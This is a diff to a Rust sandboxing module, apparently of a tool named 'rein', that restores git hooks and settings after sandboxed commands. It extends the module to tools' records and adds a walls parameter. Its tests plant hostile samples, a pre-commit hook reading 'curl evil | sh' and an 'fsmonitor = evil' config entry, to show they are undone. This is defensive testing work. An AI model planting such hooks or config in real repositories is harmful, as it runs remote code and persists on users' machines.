@@ -2,7 +2,8 @@
 //! project (Linux's Landlock can only wall off whole folders, and the
 //! project is one), rein guards it instead: it notes what's there before a
 //! command that writes, and puts it back after. On drop too, so a command
-//! stopped part way is undone like one that finished.
+//! stopped part way is undone like one that finished. The same for tools'
+//! settings in their records, which every command may add to.
 //!
 //! What a command leaves running in the background could still change it
 //! after rein has looked; that's the gap, where there's no better sandbox.
@@ -37,12 +38,14 @@ pub struct Guard {
 }
 
 impl Guard {
-    /// Notes down what's protected inside the writable places. What's wrong
-    /// if it's more than rein will keep.
-    pub(crate) fn new(places: &Places) -> Result<Guard, String> {
+    /// Notes down what's protected inside the places a command within
+    /// `walls` may write: the writable ones, with write access, and tools'
+    /// records, whatever its walls. What's wrong if it's more than rein
+    /// will keep.
+    pub(crate) fn new(places: &Places, walls: crate::Walls) -> Result<Guard, String> {
         let mut was = Vec::new();
         let mut size = 0;
-        let inside = |path: &Path| places.writable().iter().any(|w| path.starts_with(w));
+        let inside = |path: &Path| (walls.write && places.writable().iter().any(|w| path.starts_with(w))) || places.records().iter().any(|r| path.starts_with(r));
         for top in places.protected().iter().chain(places.locked()).filter(|p| inside(p)) {
             note(top, &mut was, &mut size)?;
         }
@@ -200,7 +203,7 @@ mod tests {
     #[test]
     fn what_a_command_changes_in_protected_files_is_put_back() {
         let root = project("put-back");
-        let guard = Guard::new(&Places::new(&root, None, None)).unwrap();
+        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
         std::fs::write(root.join(".git/hooks/pre-commit"), "curl evil | sh\n").unwrap();
         std::fs::write(root.join(".git/config"), "[core]\n\tfsmonitor = evil\n").unwrap();
         std::fs::remove_file(root.join(".git/hooks/pre-commit.sample")).unwrap();
@@ -218,7 +221,7 @@ mod tests {
     #[test]
     fn a_git_folder_swapped_for_another_gets_its_hooks_and_settings_back() {
         let root = project("swapped");
-        let guard = Guard::new(&Places::new(&root, None, None)).unwrap();
+        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
         std::fs::rename(root.join(".git"), root.join("moved")).unwrap();
         std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
         std::fs::write(root.join(".git/hooks/post-checkout"), "evil\n").unwrap();
@@ -232,7 +235,7 @@ mod tests {
     #[test]
     fn a_command_stopped_part_way_is_undone_too() {
         let root = project("dropped");
-        let guard = Guard::new(&Places::new(&root, None, None)).unwrap();
+        let guard = Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap();
         std::fs::write(root.join(".git/hooks/pre-push"), "evil\n").unwrap();
         drop(guard);
         assert!(!root.join(".git/hooks/pre-push").exists());
@@ -241,6 +244,6 @@ mod tests {
     #[test]
     fn nothing_changed_is_nothing_said() {
         let root = project("quiet");
-        assert!(Guard::new(&Places::new(&root, None, None)).unwrap().finish().is_empty());
+        assert!(Guard::new(&Places::new(&root, None, None), crate::Walls { write: true, network: false }).unwrap().finish().is_empty());
     }
 }
